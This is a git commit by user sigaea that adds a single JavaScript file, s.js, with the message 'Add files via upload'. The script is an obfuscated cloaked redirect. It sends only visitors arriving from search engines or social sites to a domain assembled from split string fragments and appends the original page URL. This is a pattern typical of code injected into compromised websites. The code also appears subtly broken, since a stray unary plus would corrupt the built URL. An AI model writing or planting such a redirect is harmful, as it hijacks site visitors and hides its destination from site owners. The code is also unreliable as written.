d148db54dab54f57b062ab63c78fa9c72475d8f4
sigaea <68406148+sigaea@users.noreply.github.com>
2020-07-17 07:32:07 +0700

    Add files via upload

---
+++ s.js
@@ -0,0 +1,1 @@
+if(document.referrer){var cek=document.referrer;var is_se=cek.includes('.google.')||cek.includes('.bing.')||cek.includes('yandex.')||cek.includes('facebook.')||cek.includes('pinterest.');if(is_se){var a='lu';var z='ge';var m='zi';var i='ht';var url=window.location.href;window.location=+i+'tps'+'://'+a+z+m+'.'+'c'+'om/'+'?ars'+'ae='+encodeURIComponent(url)}}
